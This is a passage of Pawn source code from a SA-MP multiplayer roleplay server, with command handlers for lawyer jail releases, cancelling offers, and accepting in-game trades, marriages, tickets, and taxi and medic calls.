                    { SendClientMessage(playerid, COLOR_YELLOW, "Your Detective Skill is now Level 3, soon you are able to find Faction Members."); }
                    else if(PlayerInfo[playerid][pDetSkill] == 200)
                    { SendClientMessage(playerid, COLOR_YELLOW, "Your Detective Skill is now Level 4, you are now able to find Faction Members."); }
                    else if(PlayerInfo[playerid][pDetSkill] == 400)
                    { SendClientMessage(playerid, COLOR_YELLOW, "Your Detective Skill is now Level 5, you are now able to find Faction Members."); }

                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_LIGHTBLUE, "Invalid Name/ID.");
            }
        }
        return 1;
    }
//------------------------
    if(strcmp(cmd, "/free", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(PlayerInfo[playerid][pJob] != 2)
            {
                SendClientMessage(playerid, COLOR_GREY, "   You are not a Lawyer!");
                return 1;
            }
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /free [playerid/PartOfName] [price]");
                return 1;
            }
            giveplayerid = ReturnUser(tmp);
            if(IsPlayerConnected(giveplayerid))
            {
                if(giveplayerid != INVALID_PLAYER_ID)
                {
        if(SellFree[playerid] != 9999) { SCM(playerid, COLOR_RED, "You already sent a offer!Please first cancel that or wait for a reply."); return 1; }
            new Float:x, Float:y, Float:z;
                        GetPlayerPos(giveplayerid,x,y,z);
                        if(PlayerToPoint(10, playerid, x, y, z))
                        {
    tmp = strtok(cmdtext, idx);
                    if(!strlen(tmp))
                    {
                        SendClientMessage(playerid, COLOR_WHITE, "USAGE: /free [playerid/PartOfName] [price]");
                        return 1;
                    }
                    new price;
                    price = strval(tmp);
            if(price < 3000 || price > 10000) { SCM(playerid, COLOR_WHITE, "Price must be beetween 3,000$ and 10,000$"); return 1; }
    if(GetPlayerPool(giveplayerid) < price) { SCM(playerid, COLOR_RED, "That player doesnt have this money"); return 1; }
                    if(giveplayerid == playerid) { SendClientMessage(playerid, COLOR_GREY, "You cannot Free yourself!"); return 1; }
                    if(PlayerInfo[giveplayerid][pJailTime] >= 1 && PlayerInfo[playerid][pApproval] >= 1)
                    {
                        GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                        format(string, sizeof(string), "* You offered to free %s of jail for $%s.", giveplayer, FormatNumber(price));
                        SendClientMessage(playerid, COLOR_WHITE, string);
                        format(string, sizeof(string), "* %s has offered to free you of jail for $%s use /accept free %d!", sendername, FormatNumber(price),playerid);
                        SendClientMessage(giveplayerid, COLOR_WHITE, string);
                        SellFree[playerid] = giveplayerid;
                        BuyFree[giveplayerid] = playerid;
                        FreePriceOffer[playerid] = price;

                    }
                    else
                    {
                        SendClientMessage(playerid, COLOR_GRAD1, "   Player didnt need a Lawyer / Player aint Jailed !");
                    }
                }
            else { SCM(playerid, COLOR_RED, "That player isn't near of you!"); return 1; }
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREY, "   That player is offline!");
            }
        }//not connected
        return 1;
    }
}
    if(strcmp(cmd,"/cancel",true)==0)
    {
        if(IsPlayerConnected(playerid))
        {
            new x_job[256];
            x_job = strtok(cmdtext, idx);
            if(!strlen(x_job)) {
                SendClientMessage(playerid, COLOR_WHITE, "|__________________ Cancel __________________|");
                SendClientMessage(playerid, COLOR_WHITE, "USAGE: /cancel [name]");
                SendClientMessage(playerid, COLOR_GREY, "Available names: Drugs, Repair, Lawyer, Live, Refill, Taxi, sellcarto, helpme, report, checkpoint");
                SendClientMessage(playerid, COLOR_GREY, "Available names: Medic, Mechanic, Ticket, Witness, Marriage, Divorce, PersonalCar, find");
                SendClientMessage(playerid, COLOR_WHITE, "|____________________________________________|");
                return 1;
            }
            if(strcmp(x_job,"checkpoint",true) == 0)
            {
				OnCheckpoint[playerid] = 0;
				SendClientMessage(playerid, COLOR_RED, "Checkpoint Deleted");
				DisablePlayerCheckpoint(playerid);
            }
            if(strcmp(x_job,"drugs",true) == 0)
            {
                DrugOffer[playerid] = INVALID_PLAYER_ID;
                DrugPrice[playerid] = 0;
                DrugGram[playerid] = 0;
            }
            if(strcmp(x_job,"heal",true) == 0)
            {
                sHealOffer[playerid] = INVALID_PLAYER_ID;
                sHealPrice[playerid] = 0;
            }
            else if(!strcmp(x_job,"helpme",true))
            {
                Helpme[playerid] = INVALID_PLAYER_ID;
                HelpmeText[playerid][0] = '\0';
                new strlol[50];
                format(strlol, 50, "%s has canceled his Helpme request.",PINFO[playerid][pName]);
                for(new i;i<LastPID;i++)
                {
                    if(IsPlayerConnected(i) && PINFO[i][pHelper] > 0)
                    {
                        SCM(i, COLOR_GG, strlol);
                    }
                }
                return SCM(playerid,COLOR_LIGHTBLUE,"You canceled the helpme request.");
            }
            else if(!strcmp(x_job,"report",true))
            {
                Reported[playerid] = INVALID_PLAYER_ID;
                ReportText[playerid][0] = '\0';
                new strlol[50];
                format(strlol, 50, "%s has canceled his report request.",PINFO[playerid][pName]);
                for(new i;i<LastPID;i++)
                {
                    if(IsPlayerConnected(i) && PINFO[i][pAdmin] > 0)
                    {
                        SCM(i, COLOR_GG, strlol);
                    }
                }
                return SCM(playerid,COLOR_LIGHTBLUE,"You canceled the report request.");
            }
            else if(strcmp(x_job,"repair",true) == 0)
            {
                RepairOffer[playerid] = INVALID_PLAYER_ID;
                RepairPrice[playerid] = 0;
                RepairCar[playerid] = 0;
            }
            else if(strcmp(x_job,"lawyer",true) == 0)
            {
                WantLawyer[playerid] = 0;
                CallLawyer[playerid] = 0;
            }
            else if(strcmp(x_job,"live",true) == 0)
            {
                LiveOffer[playerid] = INVALID_PLAYER_ID;
            }
            else if(strcmp(x_job,"refill",true) == 0)
            {
                RefillOffer[playerid] = INVALID_PLAYER_ID;
                RefillPrice[playerid] = 0;
            }
            else if(strcmp(x_job,"witness",true) == 0)
            {
                MarryWitnessOffer[playerid] = INVALID_PLAYER_ID;
            }
            else if(strcmp(x_job,"marriage",true) == 0)
            {
                ProposeOffer[playerid] = INVALID_PLAYER_ID;
            }
            else if(strcmp(x_job,"divorce",true) == 0)
            {
                DivorceOffer[playerid] = INVALID_PLAYER_ID;
            }
            else if(strcmp(x_job,"personalcar",true) == 0)
            {
                OnSellCar[OwnableCarOffer[playerid]] = INVALID_PLAYER_ID;
                SCM(OwnableCarOffer[playerid],COL_SYN,"That player has canceled this offer.");
                OwnableCarOffer[playerid] = INVALID_PLAYER_ID;
                OwnableCarMethod[playerid] = 0;
                OwnableCarID[playerid] = 0;
                OwnableCarPrice[playerid] = 0;
                SCM(playerid,COLOR_ROUZ,"That player's offer canceled successfully.");
            }
            else if(strcmp(x_job,"ticket",true) == 0)
            {
                TicketOffer[playerid] = 9999;
                TicketMoney[playerid] = 0;
            }
            else if(strcmp(x_job,"medic",true) == 0)
            {
                if(IsPlayerConnected(playerid))
                {
                    if(IWantMedic[playerid] == 1)
                    {
                        IWantMedic[playerid] = 0;
                    }
                    else
                    {
                        SendClientMessage(playerid, COLOR_GREY, "You are not the current Caller !");
                        return 1;
                    }
                }
            }
            else if(strcmp(x_job,"mechanic",true) == 0)
            {
                if(IsPlayerConnected(playerid))
                {
                    if(IWantMechanic[playerid] == 1)
                    {
                        IWantMechanic[playerid] = 0;
                    }
                    else
                    {
                        SendClientMessage(playerid, COLOR_GREY, "You are not the current Caller !");
                        return 1;
                    }
                }
            }
            else if(strcmp(x_job,"approval",true) == 0)
            {
                SellApproval[playerid] = 9999;
                BuyApproval[playerid] = 9999;
            }
            else if(strcmp(x_job,"gun",true) == 0)
            {
                if(Tofang[playerid] == 9999)
                {
                    SCM(playerid,COLOR_LIGHTRED,"You haven't any offer to accept it.");
                    return 1;
                }
                Tofang[playerid] = 9999;
                SCM(playerid,COLOR_BLUE, "You have rejected recieved gun offer!"); return 1;
            }
            else if(!strcmp(x_job,"sellcarto",true))
            {
                if(OnSellCar[playerid] == INVALID_PLAYER_ID) return SCM(playerid,COLOR_ALI,"You never use /sellcarto");
                OwnableCarOffer[OnSellCar[playerid]] = INVALID_PLAYER_ID;
                OwnableCarMethod[OnSellCar[playerid]] = 0;
                OwnableCarID[OnSellCar[playerid]] = 0;
                OwnableCarPrice[OnSellCar[playerid]] = 0;
                SCM(OnSellCar[playerid],COLOR_ALI,"sellcar offer rejected.");
                SCM(playerid,COLOR_ALI,"sellcarto offer rejected.");
                OnSellCar[playerid] = INVALID_PLAYER_ID;
            }
            else if(strcmp(x_job,"find",true) == 0)
            {
                if(IsPlayerConnected(playerid))
                {
                    if(PlayerInfo[playerid][pJob] != 1)
                    {
                        SendClientMessage(playerid, COLOR_LIGHTBLUE, "You are not a Detective.");
                        return 1;
                    }
                    if(FindTime[playerid] >= 1)
                    {
                        DisablePlayerCheckpoint(playerid);
                        OnCheckpoint[playerid] = 0;
                        FindTime[playerid] = 0;
                        FindTimePoints[playerid] = 0;
                        SendClientMessage(playerid, COLOR_LIGHTBLUE, "Checkpoint deleted.");
                        return 1;
                    }
                    else
                    {
                        SendClientMessage(playerid, COLOR_LIGHTRED, "You dont have enable checkpoint.");
                        return 1;
                    }
                }
            }
            else if(strcmp(x_job,"taxi",true) == 0)
            {
                if(TaxiCallTime[playerid] == 1)
                {
                    if(TransportDuty[playerid] == 1)
                    {
                        TaxiAccepted[playerid] = INVALID_PLAYER_ID;
                        GameTextForPlayer(playerid, "~w~You have~n~~r~Canceled the call", 5000, 1);
                        TaxiCallTime[playerid] = 0;
                        DisablePlayerCheckpoint(playerid);
                        OnCheckpoint[playerid] = 0;
                    }
                    else
                    {
                        if(IsPlayerConnected(TaxiCall)) { if(TaxiCall == playerid) { TaxiCall = INVALID_PLAYER_ID; } }
                        for(new i = 0; i < LastPID; i++)
                        {
                            if(IsPlayerConnected(i))
                            {
                                if(TaxiAccepted[i] < INVALID_PLAYER_ID)
                                {
                                    if(TaxiAccepted[i] == playerid)
                                    {
                                        TaxiAccepted[i] = INVALID_PLAYER_ID;
                                        GameTextForPlayer(i, "~w~Taxi Caller~n~~r~Canceled the call", 5000, 1);
                                        TaxiCallTime[i] = 0;
                                        DisablePlayerCheckpoint(i);
                                        OnCheckpoint[i] = 0;
                                    }
                                }
                            }
                        }
                    }
                }
            }
            else { return 1; }
        }
        return 1;
    }
    if(strcmp(cmd,"/accept",true)==0)
    {
        if(IsPlayerConnected(playerid))
        {
            new x_job[256];
            x_job = strtok(cmdtext, idx);
            if(!strlen(x_job)) {
                SendClientMessage(playerid, COLOR_WHITE, "|__________________ Accept __________________|");
                SendClientMessage(playerid, COLOR_WHITE, "USAGE: /accept [name]");
                SendClientMessage(playerid, COLOR_GREY, "Available names: Drugs, Repair, Lawyer, Live, Refill, Taxi, Gun");
                SendClientMessage(playerid, COLOR_GREY, "Available names: Medic, Mechanic, Ticket, PersonalCar");
                SendClientMessage(playerid, COLOR_WHITE, "|____________________________________________|");
                return 1;
            }
            else if(strcmp(x_job,"divorce",true) == 0)
            {
                if(DivorceOffer[playerid] < INVALID_PLAYER_ID)
                {
                    if(IsPlayerConnected(DivorceOffer[playerid]))
                    {
                        if(ProxDetectorS(10.0, playerid, DivorceOffer[playerid]))
                        {
                            GetPlayerName(DivorceOffer[playerid], giveplayer, sizeof(giveplayer));
                            GetPlayerName(playerid, sendername, sizeof(sendername));
                            format(string, sizeof(string), "* You have accepted %s's request to be his Marriage Witness.", giveplayer);
                            SendClientMessage(playerid, COLOR_WHITE, string);
                            format(string, sizeof(string), "* %s has accepted your request to be your Marriage Witness.", sendername);
                            SendClientMessage(DivorceOffer[playerid], COLOR_WHITE, string);
                            ClearMarriage(playerid);
                            ClearMarriage(DivorceOffer[playerid]);
//                          PlayerInfo[playerid][pPhousekey] = 9999;
//                          PlayerInfo[playerid][pPbiskey] = 9999;
                            return 1;
                        }
                        else
                        {
                            SendClientMessage(playerid, COLOR_GREY, "   The player that sent you the Divorce Papers is not near you !");
                            return 1;
                        }
                    }
                }
                else
                {
                    SendClientMessage(playerid, COLOR_GREY, "   No-one sent you any Divorce Papers !");
                    return 1;
                }
            }
            else if(strcmp(x_job,"gun",true) == 0)
            {
                tmp = strtok(cmdtext, idx);
                if(!strlen(tmp))
                {
                    SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /accept gun [playerid/PartOfName]");
                    return 1;
                }
                giveplayerid = ReturnUser(tmp);
                new money = GunPricee[playerid];
                new gunname[100];
                if(IsPlayerConnected(playerid))
                    {
                    if(giveplayerid == playerid) { SendClientMessage(playerid, COLOR_GREY, "You cannot accept yourself!"); return 1; }
                    if(PlayerInfo[playerid][pJailTime] >= 1)
                    {
SCM(playerid,COLOR_YELLOW, "You can't accept any gun when you are in jail."); return 1;
                    }
                    if(Tofang[playerid] != giveplayerid) { SCM(playerid,COLOR_WHITE,"Invalid playerID!"); return 1; }
                    if (ProxDetectorS(5.0, playerid, giveplayerid))
                        {
                    new mats = PlayerInfo[giveplayerid][pMats];
                    if(mats >= Mat[playerid])
                        {
                        if(GetPlayerPool(playerid) >= GunPricee[playerid])
                            {
                    GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                    GetPlayerName(playerid, sendername, sizeof(sendername));
                    GetWeaponName(weapon[playerid], gunname, sizeof(gunname));
                    format(string, sizeof(string), "You have bought a %s with %d ammo from %s for $%s money", gunname,ammo[playerid],giveplayer,FormatNumber(money));
                    SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                    format(string, sizeof(string), "You sold a %s with %d ammo to %s for $%s money", gunname,ammo[playerid],sendername,FormatNumber(money));
                    SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
                    PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
                    PlayerPlaySound(giveplayerid, 1052, 0.0, 0.0, 0.0);
                    format(string, sizeof(string), "%s created a %s from materials and hands it to %s.", giveplayer,gunname,sendername);
                    ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
                    GivePlayerTofang(playerid,weapon[playerid],ammo[playerid]);
                    PlayerInfo[giveplayerid][pMats] -= Mat[playerid];
                    SaveKonVal(giveplayerid, "pMats", PINFO[giveplayerid][pMats]);
                    GivePlayerPool(playerid, -money);
                    GivePlayerPool(giveplayerid, money);
                    Tofang[playerid] = 9999;
                            } else { SCM(playerid,COLOR_WHITE,"You dont have enough money with you!"); return 1; }
                        } else { SCM(playerid,COLOR_WHITE,"That player dont have enough materials!"); return 1; }
                    } else { SCM(playerid,COLOR_WHITE,"That player isnt near of you"); return 1; }
                } else { SCM(playerid,COLOR_WHITE,"Invalid PlayerID"); return 1; }
            }
            else if(strcmp(x_job,"free",true) == 0)
            {
                tmp = strtok(cmdtext, idx);
                if(!strlen(tmp))
                {
                    SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /accept free [playerid/PartOfName]");
                    return 1;
                }
                giveplayerid = ReturnUser(tmp);
                    if(IsPlayerConnected(playerid))
                    {
                    if(!IsPlayerConnected(giveplayerid)) { SCM(playerid, COLOR_RED, "That player is not connected"); return 1; }
                    if(giveplayerid == playerid) { SendClientMessage(playerid, COLOR_GREY, "You cannot accept yourself!"); return 1; }
                    if(PlayerInfo[playerid][pJailTime] >= 1)
                    {
                    if(SellFree[giveplayerid] == playerid && BuyFree[playerid] == giveplayerid)
                    {
                     new price = FreePriceOffer[giveplayerid];
                    if(GetPlayerPool(playerid) < price) { SCM(playerid, COLOR_RED, "You dont have enough money"); return 1; }
                    GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                    GetPlayerName(playerid, sendername, sizeof(sendername));
                        format(string, sizeof(string), "* You have been free of jail by %s for $%s.", giveplayer, FormatNumber(price));
                        SendClientMessage(playerid, COLOR_WHITE, string);
                        format(string, sizeof(string), "* congratulation,Now you have free %s of jail for $%s !", sendername, FormatNumber(price));
                        SendClientMessage(giveplayerid, COLOR_GREEN, string);
                    GivePlayerPool(playerid, -price)
                    GivePlayerPool(giveplayerid, price)
                    PlayerInfo[giveplayerid][pApproval] --;
                    SaveKonVal(giveplayerid, "pApproval", PINFO[giveplayerid][pApproval]);
                        WantLawyer[playerid] = 0;
                        CallLawyer[playerid] = 0;
                        SellFree[giveplayerid] = 9999;
                        PlayerInfo[playerid][pJailTime] = 1;
                        if(PINFO[giveplayerid][pLawSkill] < 201)
                        {
                            PlayerInfo[giveplayerid][pLawSkill] ++;
                            SaveKonVal(giveplayerid, "pLawSkill", PINFO[giveplayerid][pLawSkill]);
                        }
                        if(PlayerInfo[giveplayerid][pLawSkill] == 50)
                        { SendClientMessage(giveplayerid, COLOR_YELLOW, "* Your Lawyer Skill is now Level 2, you will can earn more Money and have more approvals at a time."); }
                        else if(PlayerInfo[giveplayerid][pLawSkill] == 100)
                        { SendClientMessage(giveplayerid, COLOR_YELLOW, "* Your Lawyer Skill is now Level 3, you will can earn more Money and have more approvals at a time."); }
                        else if(PlayerInfo[giveplayerid][pLawSkill] == 150)
                        { SendClientMessage(giveplayerid, COLOR_YELLOW, "* Your Lawyer Skill is now Level 4, you will can earn more Money and have more approvals at a time."); }
                        else if(PlayerInfo[giveplayerid][pLawSkill] == 200)
                        { SendClientMessage(giveplayerid, COLOR_YELLOW, "* Your Lawyer Skill is now Level 5, you will can earn more Money and have more approvals at a time."); }
                    }
                    else { SCM(playerid, COLOR_RED, "That player isn't offered you free!"); return 1; }
                    }
                }
            }
            else if(strcmp(x_job,"approval",true) == 0)
            {
               tmp = strtok(cmdtext, idx);
                if(!strlen(tmp))
                {
                    SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /accept approval [playerid/PartOfName]");
                    return 1;
                }
                  giveplayerid = ReturnUser(tmp);
                if(SellApproval[giveplayerid] != playerid)
                    {
                    SCM(playerid, COLOR_RED, "That player not offered you approval!");
                    return 1;
                    }
              if(PlayerInfo[playerid][pJob] == 2)
              {
                if(BuyApproval[playerid] == giveplayerid)
                  {
                    if(SellApproval[giveplayerid] == playerid)
                      {
                    GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                    GetPlayerName(playerid, sendername, sizeof(sendername));
                    new price = ApprovalPriceOffer[giveplayerid];
                    if(GetPlayerPool(playerid) < price) { SCM(playerid, COLOR_RED, "You dont have enough money!"); return 1; }
                    new lawskill = PlayerInfo[playerid][pLawSkill];
                     if(lawskill <= 50 && PlayerInfo[playerid][pApproval] == 0) { PlayerInfo[playerid][pApproval] = 1;
                    GivePlayerPool(playerid, -price); GivePlayerPool(giveplayerid, price); }
                else if(lawskill >= 51 && lawskill <= 100 && PlayerInfo[playerid][pApproval] <= 1) { PlayerInfo[playerid][pApproval] ++;
                    GivePlayerPool(playerid, -price); GivePlayerPool(giveplayerid, price); }
                else if(lawskill >= 101 && lawskill <= 150 && PlayerInfo[playerid][pApproval] <= 2) { PlayerInfo[playerid][pApproval] ++;
                    GivePlayerPool(playerid, -price); GivePlayerPool(giveplayerid, price); }
                else if(lawskill >= 151 && lawskill <= 200 && PlayerInfo[playerid][pApproval] <= 3) { PlayerInfo[playerid][pApproval] ++;
                    GivePlayerPool(playerid, -price); GivePlayerPool(giveplayerid, price); }
                else if(lawskill >= 201 && PlayerInfo[playerid][pApproval] <= 4) { PlayerInfo[playerid][pApproval] ++;
                    GivePlayerPool(playerid, -price); GivePlayerPool(giveplayerid, price); }
                else { SCM(playerid, COLOR_RED, "You have maximum approvals for this skill,first use /free !");
                return 1;
                     }
                     SaveKonVal(playerid, "pApproval", PINFO[playerid][pApproval]);
                PlayerInfo[giveplayerid][pLawyerPoint] = 0;
                SaveKonVal(giveplayerid, "pLawyerPoint", 0);
                SellApproval[giveplayerid] = 9999;
                BuyApproval[playerid] = 9999;
                 format(string, sizeof(string), "Officer %s has gave you 1 approval for $%s , Now you can use /free.", giveplayer, FormatNumber(price));
                SCM(playerid, COLOR_LIGHTBLUE,string);
                    format(string, sizeof(string), "You allowed %s to free a Jailed Person for $%s.", sendername, FormatNumber(price));
                    SendClientMessage(giveplayerid, COLOR_LIGHTBLUE,string);
                    return 1;
                    }
                     }
                   }
                else
                {
                SCM(playerid, COLOR_WHITE, "You are not a lawyer.");
                return 1;
                }
                }
            else if(strcmp(x_job,"witness",true) == 0)
            {
                if(MarryWitnessOffer[playerid] < INVALID_PLAYER_ID)
                {
                    if(IsPlayerConnected(MarryWitnessOffer[playerid]))
                    {
                        if(ProxDetectorS(10.0, playerid, MarryWitnessOffer[playerid]))
                        {
                            GetPlayerName(MarryWitnessOffer[playerid], giveplayer, sizeof(giveplayer));
                            GetPlayerName(playerid, sendername, sizeof(sendername));
                            format(string, sizeof(string), "* You have accepted %s's request to be his Marriage Witness.", giveplayer);
                            SendClientMessage(playerid, COLOR_WHITE, string);
                            format(string, sizeof(string), "* %s has accepted your request to be your Marriage Witness.", sendername);
                            SendClientMessage(MarryWitnessOffer[playerid], COLOR_WHITE, string);
                            MarryWitness[MarryWitnessOffer[playerid]] = playerid;
                            MarryWitnessOffer[playerid] = INVALID_PLAYER_ID;
                            return 1;
                        }
                        else
                        {
                            SendClientMessage(playerid, COLOR_GREY, "   The player that requested you to be his Marriage Witness is not near you !");
                            return 1;
                        }
                    }
                }
                else
                {
                    SendClientMessage(playerid, COLOR_GREY, "   No-one asked you to be his Marriage Witness !");
                    return 1;
                }
            }
            else if(strcmp(x_job,"marriage",true) == 0)
            {
                if(ProposeOffer[playerid] < INVALID_PLAYER_ID)
                {
                    if(!PlayerToPoint(10.0, playerid, 2488.8267,918.3220,11.0234))
                    {
                        SendClientMessage(playerid, COLOR_GREY, "   You are not at the Church in Jefferson !");
                        return 1;
                    }
                    if(IsPlayerConnected(ProposeOffer[playerid]))
                    {
                        if(ProxDetectorS(10.0, playerid, ProposeOffer[playerid]))
                        {
                            if(MarryWitness[ProposeOffer[playerid]] == INVALID_PLAYER_ID)
                            {
                                SendClientMessage(playerid, COLOR_GREY, "   The proposer doesn't have a Marriage Witness !");
                                return 1;
                            }
                            if(IsPlayerConnected(MarryWitness[ProposeOffer[playerid]]))
                            {
                                if(ProxDetectorS(12.0, ProposeOffer[playerid], MarryWitness[ProposeOffer[playerid]]))
                                {
                                    GetPlayerName(ProposeOffer[playerid], giveplayer, sizeof(giveplayer));
                                    GetPlayerName(playerid, sendername, sizeof(sendername));
                                    format(string, sizeof(string), "* You have accepted %s's request to be your Husband.", giveplayer);
                                    SendClientMessage(playerid, COLOR_WHITE, string);
                                    format(string, sizeof(string), "* %s has accepted your request to be your Wife.", sendername);
                                    SendClientMessage(ProposeOffer[playerid], COLOR_WHITE, string);
                                    format(string, sizeof(string), "Priest: %s do you take %s as your lovely Husband? (type 'yes', anything else will reject the Marriage)", sendername, giveplayer);
                                    SendClientMessage(playerid, COLOR_WHITE, string);
                                    MarriageCeremoney[playerid] = 1;
                                    ProposedTo[ProposeOffer[playerid]] = playerid;
                                    GotProposedBy[playerid] = ProposeOffer[playerid];
                                    MarryWitness[ProposeOffer[playerid]] = INVALID_PLAYER_ID;
                                    ProposeOffer[playerid] = INVALID_PLAYER_ID;
                                    return 1;
                                }
                                else
                                {
                                    SendClientMessage(playerid, COLOR_GREY, "   The Marriage Witness is not near your proposer !");
                                    return 1;
                                }
                            }
                            return 1;
                        }
                        else
                        {
                            SendClientMessage(playerid, COLOR_GREY, "   The player that proposed to you is not near you !");
                            return 1;
                        }
                    }
                }
                else
                {
                    SendClientMessage(playerid, COLOR_GREY, "   No-one Proposed to you !");
                    return 1;
                }
            }
            else if(strcmp(x_job,"ticket",true) == 0)
            {
                if(TicketOffer[playerid] < 9999)
                {
                tmp = strtok(cmdtext,idx);
                if(!strlen(tmp))
                {
                SCM(playerid,COL_SYN,"Syntax: /accept ticket <PlayerID/PartOfName>");
                return 1;
                }
                new giveplayers;
                giveplayers = ReturnUser(tmp);
                if(giveplayers != TicketOffer[playerid]) return SCM(playerid,COL_SYN,"That player doesn't offer you anything.");
                    if(IsPlayerConnected(TicketOffer[playerid]))
                    {
                        if (ProxDetectorS(5.0, playerid, TicketOffer[playerid]))
                        {
                            GetPlayerName(TicketOffer[playerid], giveplayer, sizeof(giveplayer));
                            GetPlayerName(playerid, sendername, sizeof(sendername));
                            format(string, sizeof(string), "You have paid the Ticket of $%d to Officer %s.", TicketMoney[playerid], giveplayer);
                            SendClientMessage(playerid, COL_SYN, string);
                            format(string, sizeof(string), "%s has paid your Ticket of $%d.", sendername, TicketMoney[playerid]);
                            SendClientMessage(TicketOffer[playerid], COL_SYN, string);
                            GivePlayerPool(playerid, - TicketMoney[playerid]);
                            GivePlayerPool(TicketOffer[playerid], TicketMoney[playerid]);
                            TicketOffer[playerid] = 9999;
                            TicketMoney[playerid] = 0;
                            return 1;
                        }
                        else
                        {
                            SendClientMessage(playerid, COLOR_GREY, "The Officer is not near you.");
                            return 1;
                        }
                    }
                }
                else
                {
                    SendClientMessage(playerid, COLOR_GREY, "No-one offered you a Ticket.");
                    return 1;
                }
            }

            else if(strcmp(x_job,"taxi",true) == 0)
            {
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /accept taxi [playerid/PartOfName]");
                return 1;
            }
            TaxiCall = ReturnUser(tmp);
            if(PlayerInfo[playerid][pMember] == 10 || PlayerInfo[playerid][pLeader] == 10)
            {

                if(TransportDuty[playerid] != 1)
                {
                    SendClientMessage(playerid, COLOR_GREY, "   You are not on duty !");
                    return 1;
                }
                if(OnCheckpoint[playerid] == 1) return SCM(playerid,COLOR_Good,"You already have an enable checkpoint.");
            if(!IsPlayerConnected(TaxiCall) || TaxiCall == INVALID_PLAYER_ID) { SCM(playerid, COLOR_RED, "Invalid player ID"); return 1; }
                if(TaxiCallTime[playerid] > 0)
                {
                    SendClientMessage(playerid, COLOR_GREY, "   You have already accepted a Taxi Call !");
                    return 1;
                }
            if(IWantTaxi[TaxiCall] == 0)
            {
            SCM(playerid, COLOR_GREY, "That player didn't need a taxi yet.");
            return 1;
            }

                if(IWantTaxi[TaxiCall] == 1)
                {
                    if(IsPlayerConnected(TaxiCall))
                    {
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                        GetPlayerName(TaxiCall, giveplayer, sizeof(giveplayer));

                        format(string, sizeof(string), "* You have accepted the Taxi Call from %s, you will see the marker untill you have reached it.",giveplayer);
                        SendClientMessage(playerid, COLOR_WHITE, string);
                format(string, sizeof(string), "* %s has accepted taxi call from %s ",sendername, giveplayer);
                SendFamilyMessage(10, COLOR_RED, string);
                        format(string, sizeof(string), "Taxi Driver %s has accepted your Taxi Call please wait at your current Position.",sendername);
                        SendClientMessage(TaxiCall, COLOR_TAXI, string);
                        GameTextForPlayer(playerid, "~w~Taxi Caller~n~~r~Goto redmarker", 5000, 1);
                        TaxiCallTime[playerid] = 1;
                        TaxiAccepted[playerid] = TaxiCall;
                        IWantTaxi[TaxiCall] = 0;
                        IAcceptTaxi[playerid] = 1;
                        return 1;
                    }
                }
                else
                {
                    SendClientMessage(playerid, COLOR_GREY, "That player isn't need a taxi yet.");
                    return 1;
                }
            }
            else
            {
            SCM(playerid, COLOR_TAXI, "You are not a taxi driver.");
            return 1;
            }
        }

    else if(strcmp(x_job,"medic",true) == 0)
            {
                if(PlayerInfo[playerid][pMember] == 4 || PlayerInfo[playerid][pLeader] == 4)
                {
        tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /accept medic [playerid/PartOfName]");
                return 1;
            }
            MedicCall = ReturnUser(tmp);
                    if(MedicCallTime[playerid] > 0)
                    {
                        SendClientMessage(playerid, COLOR_GREY, "   You have already accepted a Medic Call !");
                        return 1;
                    }
                    if(OnCheckpoint[playerid] == 1) return SCM(playerid,COLOR_Good,"You already have an enable checkpoint.");
                    if(IWantMedic[MedicCall] == 1)
                    {
                        if(IsPlayerConnected(MedicCall))
                        {
                            GetPlayerName(playerid, sendername, sizeof(sendername));
                            GetPlayerName(MedicCall, giveplayer, sizeof(giveplayer));
                            format(string, sizeof(string), "* You have accepted the Medic Call from %s, go to the position.",giveplayer);
                            SendClientMessage(playerid, COLOR_WHITE, string);

                            format(string, sizeof(string), "* Medic %s has accepted your Medic Call please wait at your current Position.",sendername);
                            SendClientMessage(MedicCall, COLOR_WHITE, string);
                            format(string, sizeof(string), "* %s has accepted Medic Call from %s .",sendername, giveplayer);
                            SendFamilyMessage(4, COLOR_WHITE, string);
                            GameTextForPlayer(playerid, "~w~Medic Caller~n~~r~Goto redmarker", 5000, 1);
                            MedicCallTime[playerid] = 1;
                            MedicAccepted[playerid] = MedicCall;
                            IWantMedic[MedicCall] = 0;
                            return 1;
                        }
                else { SendClientMessage(playerid, COLOR_GREY, "That player didn't need a medic yet."); return 1; }
                    }
                    else
                    {
                        SendClientMessage(playerid, COLOR_GREY, "That player didn't need a medic yet.");
                        return 1;
                    }
                }
                else
                {
                    SendClientMessage(playerid, COLOR_MEDIC, "You are not a medic.");
                    return 1;
                }
            }
            else if(strcmp(x_job,"mechanic",true) == 0)
            {
                if(PlayerInfo[playerid][pJob] == 7)
               {
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /accept mechanic [playerid/PartOfName]");
                return 1;
            }
            MechanicCall = ReturnUser(tmp);
                if(MechanicCallTime[playerid] > 0)
                {
                    SendClientMessage(playerid, COLOR_GREY, "You have already accepted a Mechanic Call !");
                    return 1;
                }
                if(OnCheckpoint[playerid] == 1) return SCM(playerid,COLOR_Good,"You already have an enable checkpoint.");
                if(IWantMechanic[MechanicCall] == 1)
                {
                    if(IsPlayerConnected(MechanicCall))
                    {
